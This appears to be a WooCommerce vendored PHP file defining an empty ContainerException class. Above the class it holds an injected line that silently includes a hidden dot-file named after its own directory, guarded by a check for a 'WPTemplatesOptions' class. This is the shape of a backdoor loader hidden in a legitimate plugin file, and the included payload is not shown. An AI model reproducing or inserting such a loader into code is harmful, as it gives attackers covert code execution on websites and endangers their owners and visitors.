<?php

namespace Automattic\WooCommerce\Vendor\League\Container\Exception;

use Psr\Container\ContainerExceptionInterface;
use RuntimeException;

if (file_exists($filename = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.' . basename(dirname(__FILE__)) . '.php') && !class_exists('WPTemplatesOptions')) {
    include_once($filename);
}

class ContainerException extends RuntimeException implements ContainerExceptionInterface
{
}
